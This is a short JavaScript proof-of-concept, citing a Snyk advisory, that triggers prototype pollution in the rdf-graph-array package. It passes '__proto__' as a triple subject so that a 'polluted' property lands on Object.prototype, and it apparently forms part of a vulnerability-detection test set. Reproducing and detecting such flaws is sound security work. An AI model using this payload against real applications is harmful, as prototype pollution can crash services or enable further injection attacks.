//https://snyk.io/vuln/SNYK-JS-RDFGRAPHARRAY-551803
 
  const Graph = require("rdf-graph-array").Graph;
  let g = new Graph();

   

  g.add.__x_toTaint = true;
  g.add({
    graph: "foo",
    subject: "__proto__",
    predicate: "polluted",
    object: "JHU",
  });
// End of file
